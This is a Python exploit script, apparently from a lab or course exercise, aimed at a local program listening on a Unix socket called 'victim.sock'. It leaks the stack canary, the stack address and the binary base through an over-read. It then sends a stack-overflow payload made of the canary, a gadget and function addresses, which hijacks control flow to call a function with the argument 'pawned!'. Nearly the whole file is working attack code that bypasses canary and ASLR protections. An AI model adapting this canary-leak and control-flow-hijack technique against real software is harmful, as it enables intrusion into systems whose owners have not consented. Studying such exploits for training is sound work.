#python3
import socket
import sys
from os.path import expanduser

# Create a UDS socket
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
home = expanduser("~")
server_address = home + '/victim.sock'
print('connecting to {}'.format(server_address))
try:
    sock.connect(server_address)
except socket.error as msg:
    print(msg)
    sys.exit(1)

def zerochecker(bytes, expectedLength):
    while len(bytes) != expectedLength:
        bytes = "0x0" + bytes[2:]
    return bytes

try:

    # Send data for canary
    message = b'AAAAAAAAAAAAAAAAAAAAAAAA\n32\n'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)

    # receive canary back
    while amount_received < amount_expected:
        data = sock.recv(32)
        amount_received += len(data)
        hex_canary = zerochecker(hex(int.from_bytes(data[24:],"little")), 18)
        print("Hex canary read in as:")
        print(hex_canary)
        canary_byte_array = bytearray.fromhex(hex_canary[2:])
        canary_byte_array.reverse()
        desired_canary = b"\x00\xa9\x2b\xcc\x5d\x61\x73\x36"
        if desired_canary == canary_byte_array:
            print("CANARY ARRAYS MATCH")
        else:
            print("CANARY ARRAYS DO NOT MATCH")

    # Send data for stack base
    message = b'\n6\n'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)
    while amount_received < amount_expected:
        data = sock.recv(6)
        amount_received += len(data)
        stack_base = zerochecker(hex(int.from_bytes(data,"little")-224), 14)
        print("Stack base read in as:")
        print(stack_base)
        sbase_byte_array = bytearray.fromhex(stack_base[2:])
        sbase_byte_array.reverse()

    # Send data for binary base addr
    message = b'\n280\n'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)
    while amount_received < amount_expected:
        data = sock.recv(280)
        amount_received += len(data)
        binary_base = zerochecker(hex(int.from_bytes(data[272:],"little")), 14)
        print("Binary base read in as:")
        print(binary_base)
        bbase_byte_array = bytearray.fromhex(binary_base[2:])
        bbase_byte_array.reverse()

# exploit will consist of argstr + overflow + canary + gadget + argaddr + funcaddr

    argstr = b"pawned!"
    overflow1 = b"\x00" + b"A" * (23 - len(argstr)) # check numbers on this
    # canary_byte_array defined on first request
    # sbase_byte_array defined on second request
    overflow2 = b"A" * 8 # check numbers on this
    

    gadget = bytearray.fromhex(hex(int(binary_base, 16) +  int("0xf33", 16))[2:])
    gadget.reverse()
    

    print("hex of 2b8: " + hex(0x2b8))
    argaddr = bytearray.fromhex(hex(int(stack_base, 16) -  int("0x2c0", 16))[2:])
    argaddr.reverse()
    
    funcaddr = hex(int(binary_base, 16) + 0xaea)
    faddr_byte_array = bytearray.fromhex(funcaddr[2:])
    faddr_byte_array.reverse()

    print("funcaddr is:")
    print(funcaddr)

    exploit = argstr + overflow1 + canary_byte_array + overflow2 + gadget + b"\x00"*2  + argaddr + b"\x00" * 2 + faddr_byte_array + b"\x00" *2
    print("Canary_byte_array before sent:")
    print(canary_byte_array)

    print("gadget:")
    print(gadget)

    print("argaddr:")
    print(argaddr)

    print("faddr_byte_array")
    print(faddr_byte_array)
# Send data
    message = exploit + b"\n1\n" # correct exploit message
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)

    while amount_received < amount_expected:
        data = sock.recv(32)
        amount_received += len(data)
        # if exploit sucessfully makes server exit won't need to print anyhthing anyway

finally:
    print('closing socket')
    sock.close()
